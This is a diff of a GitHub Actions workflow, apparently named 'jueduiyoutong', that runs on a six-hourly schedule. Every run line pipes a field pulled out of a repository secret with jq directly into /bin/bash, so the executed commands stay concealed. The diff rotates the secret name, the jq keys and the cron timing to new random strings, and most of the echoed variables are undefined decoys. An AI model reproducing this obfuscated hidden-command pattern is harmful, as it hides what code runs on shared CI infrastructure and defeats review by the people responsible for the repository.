@@ -1,9 +1,9 @@
 name: jueduiyoutong
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
+    - cron: '52 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: jueduiyoutong
         env:
-          khg859: ${{ secrets.khg859 }}
+          vmxqo799: ${{ secrets.vmxqo799 }}
         run: |
-          echo $khg859 | jq -r .gtsx7 | /bin/bash
-          echo $pg0 | jq -r .s5832 | /bin/bash
-          echo $kufsc885 | jq -r .czvzp2 | /bin/bash
-          echo $ytx63 | jq -r .ugbm54 | /bin/bash
-          echo $i40 | jq -r .faziz8048 | /bin/bash
-          echo $m52243 | jq -r .foyd73392 | /bin/bash
-          echo $q43231 | jq -r .nsbaq2569 | /bin/bash
-          echo $tirs41 | jq -r .egyez37 | /bin/bash
-          echo $ntv73583 | jq -r .mknu01 | /bin/bash
-          echo $l89449 | jq -r .lrri459 | /bin/bash
-          echo $wji7 | jq -r .i4261 | /bin/bash
+          echo $vmxqo799 | jq -r .ox25 | /bin/bash
+          echo $ei09 | jq -r .ts51559 | /bin/bash
+          echo $t607 | jq -r .du9276 | /bin/bash
+          echo $ah522 | jq -r .ywwk9 | /bin/bash
+          echo $aximk43 | jq -r .s85 | /bin/bash
+          echo $dgy545 | jq -r .hv12 | /bin/bash
+          echo $nczr00406 | jq -r .pqrzy87 | /bin/bash
+          echo $nde85971 | jq -r .m506 | /bin/bash
+          echo $ncpio7 | jq -r .qi87194 | /bin/bash
 
